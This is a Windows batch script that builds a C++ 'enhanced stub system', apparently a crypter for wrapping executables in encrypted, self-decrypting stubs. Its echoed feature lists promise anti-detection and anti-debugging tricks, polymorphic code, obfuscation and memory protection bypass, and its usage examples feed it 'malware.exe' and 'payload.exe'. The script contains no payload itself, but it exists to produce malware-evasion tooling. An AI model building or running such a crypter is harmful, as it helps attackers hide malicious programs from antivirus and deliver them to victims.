@echo off
echo Enhanced Stub System - Advanced Stub Generation Framework
echo ========================================================

echo.
echo Building enhanced stub system...
echo.

REM Check for Visual Studio compiler
where cl >nul 2>&1
if %errorlevel% equ 0 (
    echo Found Visual Studio compiler
    echo Building with Visual Studio...
    echo.
    
    REM Build the enhanced stub system
    cl /std:c++17 /O2 /MT /EHsc ^
       enhanced_stub_system.cpp ^
       /Fe:enhanced_stub_system.exe ^
       /link psapi.lib wincrypt.lib
    
    if %errorlevel% equ 0 (
        echo ✓ Enhanced stub system built successfully with Visual Studio!
        echo.
        echo Features:
        echo - Multiple encryption layers (AES, ChaCha20, XOR, Custom)
        echo - Advanced anti-detection techniques
        echo - Polymorphic code generation
        echo - Dynamic API resolution
        echo - Memory protection bypass
        echo - Cross-platform compatibility
        echo - Framework integration
        echo - Auto-compilation support
        echo.
        echo Usage Examples:
        echo   enhanced_stub_system.exe aes malware.exe aes_stub.cpp
        echo   enhanced_stub_system.exe chacha20 payload.exe chacha20_stub.cpp
        echo   enhanced_stub_system.exe triple target.exe triple_stub.cpp
        echo   enhanced_stub_system.exe custom file.exe custom_stub.cpp AES XOR CUSTOM
    ) else (
        echo ✗ Visual Studio build failed
        goto try_mingw
    )
) else (
    echo Visual Studio compiler not found, trying MinGW...
    goto try_mingw
)

:try_mingw
REM Check for MinGW compiler
where g++ >nul 2>&1
if %errorlevel% equ 0 (
    echo Found MinGW compiler
    echo Building with MinGW...
    echo.
    
    REM Build the enhanced stub system
    g++ -std=c++17 -O2 -static-libgcc -static-libstdc++ ^
        enhanced_stub_system.cpp ^
        -o enhanced_stub_system.exe ^
        -lpsapi -lcrypt32
    
    if %errorlevel% equ 0 (
        echo ✓ Enhanced stub system built successfully with MinGW!
        echo.
        echo Features:
        echo - Multiple encryption layers (AES, ChaCha20, XOR, Custom)
        echo - Advanced anti-detection techniques
        echo - Polymorphic code generation
        echo - Dynamic API resolution
        echo - Memory protection bypass
        echo - Cross-platform compatibility
        echo - Framework integration
        echo - Auto-compilation support
        echo.
        echo Usage Examples:
        echo   enhanced_stub_system.exe aes malware.exe aes_stub.cpp
        echo   enhanced_stub_system.exe chacha20 payload.exe chacha20_stub.cpp
        echo   enhanced_stub_system.exe triple target.exe triple_stub.cpp
        echo   enhanced_stub_system.exe custom file.exe custom_stub.cpp AES XOR CUSTOM
    ) else (
        echo ✗ MinGW build failed
        echo.
        echo Please install either:
        echo 1. Visual Studio Build Tools
        echo 2. MinGW-w64
        echo.
        echo For Visual Studio: https://visualstudio.microsoft.com/downloads/
        echo For MinGW: https://www.mingw-w64.org/downloads/
    )
) else (
    echo No C++ compiler found!
    echo.
    echo Please install either:
    echo 1. Visual Studio Build Tools
    echo 2. MinGW-w64
    echo.
    echo For Visual Studio: https://visualstudio.microsoft.com/downloads/
    echo For MinGW: https://www.mingw-w64.org/downloads/
)

echo.
echo ================================================
echo Enhanced Stub System Features:
echo ================================================
echo ✓ Multiple Encryption Layers
echo   - AES-256 encryption
echo   - ChaCha20 stream cipher
echo   - XOR encryption
echo   - Custom encryption algorithms
echo.
echo ✓ Advanced Anti-Detection
echo   - Anti-debugging techniques
echo   - Timing-based detection
echo   - Process injection detection
echo   - PEB BeingDebugged check
echo   - Debugger process scanning
echo.
echo ✓ Polymorphic Code Generation
echo   - Random variable names
echo   - Dynamic function labels
echo   - Junk data insertion
echo   - Code obfuscation
echo.
echo ✓ Memory Protection Bypass
echo   - Executable memory allocation
echo   - Instruction cache manipulation
echo   - Cross-platform compatibility
echo   - Memory cleanup
echo.
echo ✓ Framework Integration
echo   - Seamless integration with existing components
echo   - Multiple execution methods
echo   - Custom algorithm support
echo   - Auto-compilation support
echo.

pause